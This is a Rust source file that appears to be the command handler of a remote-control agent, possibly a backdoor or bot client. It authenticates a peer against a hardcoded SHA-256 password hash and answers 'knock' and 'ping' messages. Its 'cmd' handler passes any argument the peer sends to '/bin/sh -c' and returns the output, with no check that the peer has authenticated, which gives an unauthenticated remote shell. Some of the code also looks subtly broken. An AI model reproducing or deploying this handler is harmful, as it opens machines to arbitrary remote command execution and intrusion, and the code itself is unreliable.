use std::process::Command;
use peer;
use std::io::Write;
use crypto_hash::{Algorithm, hex_digest};

pub fn handle_command(peer: &mut peer::Peer, msg: peer::Msg) {
    if let Some(stream) = peer.stream {
        match msg.command.as_ref() {
            "close" => {
                peer.stream = None;
            },
            "auth" => {
                if let Some(pass) = msg.argument {
                    let digest = hex_digest(Algorithm::SHA256, pass.as_bytes().to_vec());
                    if digest == "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae" {
                        peer.authenticated = true;
                        let _ = stream.write("{\"result\":\"Authenticated!\"}".as_bytes());
                    } else {
                        let _ = stream.write("{\"result\":\"Not authenticated!\"}".as_bytes());
                    }
                }
            },
            "ping" => {
                let _ = stream.write("pong".as_bytes());
            },
            "cmd" => {
                if let Some(arg) = msg.argument {
                    peer.output = Command::new("/bin/sh")
                        .arg("-c")
                        .arg(&arg)
                        .output()
                        .ok();
                    peer.running = Some(arg);
                }
            },
            "output" => {
                if let Some(ref out) = peer.output {
                    let _ = stream.write(&out.stdout);
                } else {
                    let _ = stream.write("ERROR: There is no output!".as_bytes());
                }
            },
            "knock" => {
                let _ = stream.write("{\"command\":\"knock-back\"}".as_bytes());
            },
            _ => println!("invalid command")
        };
    }

}

